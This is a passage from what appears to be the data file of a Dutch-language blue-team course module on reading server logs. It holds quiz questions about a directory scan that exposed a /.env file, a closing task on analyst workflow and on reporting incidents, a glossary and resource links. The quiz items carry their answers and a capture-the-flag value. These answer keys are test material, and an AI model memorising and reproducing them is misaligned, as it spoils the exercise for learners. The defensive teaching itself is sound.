        { q: "Vanaf welk IP-adres komt de directory-/padscan?", answer: ["203.0.113.88"], hint: "Filter op 404 en kijk welk IP de meeste veroorzaakt.", explain: "203.0.113.88 vuurt tientallen verzoeken af naar niet-bestaande paden: de scanner." },
        { q: "Welk gevoelig pad gaf als enige status 200 (en was dus bereikbaar)?", answer: ["/.env", ".env"], hint: "Zoek tussen de 404's en 403's van de scanner de ene 200.", explain: "GET /.env gaf 200: het configuratiebestand was per ongeluk bereikbaar — een lek." },
        { q: "Wat is de vlag in de User-Agent van die geslaagde /.env-aanvraag?", answer: ["JVT{dotenv_gelekt}"], hint: "Lees het laatste deel tussen aanhalingstekens op de /.env-regel.", explain: "De aanvaller markeerde zijn treffer in de User-Agent: JVT{dotenv_gelekt}." },
        { q: "Waarom is de User-Agent 'dirsearch/0.4.3' hier zelf al een aanwijzing (IoC)?", options: ["Het is een scantool, geen gewone browser", "Het is een verouderde browser", "Het is een zoekmachine van Google", "Dat is een normale bezoeker"], answer: 0, explain: "Gewone bezoekers melden zich als browser; een scantool-naam in de User-Agent verraadt geautomatiseerd scannen." },
      ],
    },

    {
      title: "Taak 7 — Van detectie naar melding",
      content: `
        <p>Je hebt nu drie aanvallen uit ruwe logs gevist: een brute force, een poortscan en een webscan. Tot slot:
        wat doe je met zo'n vondst, en hoe houd je het hoofd koel bij duizenden regels?</p>

        <h3>De werkwijze van een analist</h3>
        <ol>
          <li><strong>Filter breed, dan smal.</strong> Begin met een grof filter (<code>Failed password</code>,
          <code>404</code>, <code>UFW BLOCK</code>) om het type gebeurtenis te vinden. Zoom dan in op het ene IP of de
          ene gebruiker die opvalt.</li>
          <li><strong>Bouw een tijdlijn.</strong> Zet de gebeurtenissen op volgorde: scan, brute force, geslaagde
          login, nieuw account, data naar buiten. De tijdstempels vertellen het verhaal.</li>
          <li><strong>Onderscheid ruis van signaal.</strong> Eén mislukte login is niets. Een patroon is alles. Leer
          wat normaal is op jouw systemen, zodat het abnormale opvalt (dat heet een <em>baseline</em>).</li>
        </ol>

        <h3>En dan? Melden</h3>
        <p>Vind je een echte inbraak, dan begint de incidentrespons (zie de volgende room). Belangrijk om nu al te
        weten:</p>
        <ul>
          <li>Zijn er <strong>persoonsgegevens</strong> gelekt of mogelijk ingezien, dan kan er een meldplicht gelden
          bij de <strong>Autoriteit Persoonsgegevens</strong> (op grond van de AVG).</li>
          <li>Het <strong>NCSC</strong> en, afhankelijk van je sector, andere instanties willen incidenten gemeld zien,
          zeker bij essentiële of belangrijke organisaties (zie de room over incidentrespons en NIS2).</li>
          <li>Bij een strafbaar feit kun je <strong>aangifte doen bij de Politie</strong>. Bewaar daarvoor je logs en
          raak de bewijssporen niet aan.</li>
        </ul>

        <div class="callout danger">
          <strong>Raak bewijs niet kwijt:</strong> de verleiding is groot om meteen "op te ruimen". Maar logs en
          systeemsporen zijn je bewijs. Veilig stellen (een kopie maken, de tijd noteren) gaat vóór opruimen. Daarover
          gaat de volgende room: incidentrespons, stap voor stap.
        </div>

        <p>Goed gedaan: je kunt nu in echte logs een aanval herkennen en het spoor volgen. Dat is de kern van blauw
        verdedigingswerk.</p>
      `,
      questions: [
        { q: "Wat is een slimme volgorde bij het onderzoeken van logs?", options: ["Eerst breed filteren op het type gebeurtenis, dan inzoomen op het ene IP of account dat opvalt", "Meteen alle regels met de hand lezen van boven naar beneden", "Alle logs wissen en opnieuw beginnen", "Alleen naar de laatste regel kijken"], answer: 0, explain: "Breed filteren, dan smal: zo vind je het signaal in de ruis." },
        { q: "Hoe heet het beeld van wat 'normaal' is op je systemen, waartegen je het abnormale afzet?", answer: ["baseline", "een baseline"], hint: "Engels woord voor nulmeting/uitgangspunt.", explain: "Een baseline is je normaalbeeld; afwijkingen daarvan vallen op." },
        { q: "Bij wie kan een meldplicht gelden als er persoonsgegevens zijn gelekt?", answer: ["Autoriteit Persoonsgegevens", "autoriteit persoonsgegevens", "AP"], hint: "De Nederlandse privacytoezichthouder.", explain: "Een datalek met persoonsgegevens kan onder de AVG gemeld moeten worden bij de Autoriteit Persoonsgegevens." },
        { q: "Ik snap waarom je logs en sporen eerst veiligstelt voordat je gaat opruimen.", noAnswer: true },
      ],
    },
  ],
  terms: [
    { term: "Log", def: "Regel-voor-regel verslag dat een systeem bijhoudt van wat er gebeurt; de 'camerabeelden' van je IT." },
    { term: "auth.log", def: "Linux-logbestand met authenticatie: geslaagde en mislukte logins, sudo-gebruik en nieuwe sessies." },
    { term: "Access-log", def: "Webserverlog (Apache/nginx) met elk HTTP-verzoek: IP, pad, statuscode en User-Agent." },
    { term: "SIEM", def: "Security Information and Event Management: systeem dat logs centraal verzamelt, doorzoekbaar maakt en alerts genereert." },
    { term: "IDS", def: "Intrusion Detection System: detecteert en meldt verdacht verkeer of verdachte logpatronen, maar grijpt niet in." },
    { term: "IPS", def: "Intrusion Prevention System: als een IDS, maar het mag verdacht verkeer ook meteen blokkeren." },
    { term: "SOC", def: "Security Operations Center: het team dat continu naar alerts kijkt en op incidenten reageert." },
    { term: "Alert", def: "Automatische waarschuwing die een SIEM of IDS geeft als een regel wordt geraakt." },
    { term: "False positive", def: "Loos alarm: de melding ging af, maar er was niets aan de hand. Te veel ervan leidt tot alarmmoeheid." },
    { term: "False negative", def: "Gemiste aanval: er was wel degelijk iets mis, maar er ging geen alarm af." },
    { term: "Indicator of Compromise (IoC)", def: "Spoor dat verraadt dat een systeem is aangevallen of overgenomen, zoals een kwaadaardig IP, een malware-hash of een vreemde User-Agent." },
    { term: "Brute force", def: "Automatisch heel veel wachtwoorden proberen tot er één klopt; in auth.log zichtbaar als veel 'Failed password' van één IP." },
    { term: "Poortscan", def: "Kort op veel poorten van een systeem kloppen om te zien welke open staan; in de firewalllog veel verschillende DPT van één SRC." },
    { term: "Baseline", def: "Het normaalbeeld van je systemen; afwijkingen daarvan vallen op als mogelijk verdacht." },
  ],
  resources: [
    { title: "NCSC — Nationaal Cyber Security Centrum", url: "https://www.ncsc.nl/" },
    { title: "MITRE ATT&CK — technieken en detectie", url: "https://attack.mitre.org/" },
    { title: "Suricata — open source IDS/IPS", url: "https://suricata.io/" },
    { title: "TryHackMe — oefenen met blue team-skills", url: "https://tryhackme.com/" },
  ],
});
